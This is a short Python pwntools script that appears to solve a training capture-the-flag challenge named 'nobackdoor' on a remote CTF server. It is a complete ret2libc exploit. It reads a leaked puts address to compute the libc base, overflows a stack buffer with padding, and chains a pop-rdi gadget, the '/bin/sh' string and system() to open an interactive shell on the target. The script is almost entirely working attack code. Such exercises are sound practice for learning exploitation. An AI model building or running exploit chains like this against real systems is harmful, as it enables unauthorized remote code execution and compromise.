from pwn import *

#r=process('./nobackdoor')
r=remote("train2024.hitctf.cn",26402)

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)

libc=ELF('./libc.so.6')
puts_off=libc.symbols["puts"]
system_off=libc.symbols["system"]


r.recvline()
s=r.recvline()
puts_addr=s.split(b': ')[1][:-1]
puts_addr=int(puts_addr.decode('utf8'),16)
print('%x' % puts_addr)

libc_addr=puts_addr-puts_off

payload=flat(
b'a'*(0x20+8),
libc_addr+0x02a3e5,# pop rdi ;ret
libc_addr+next(libc.search(b"/bin/sh\0")),
0x040101a,
libc_addr+system_off
)
r.sendlineafter(b'input your name plz', payload)

r.interactive()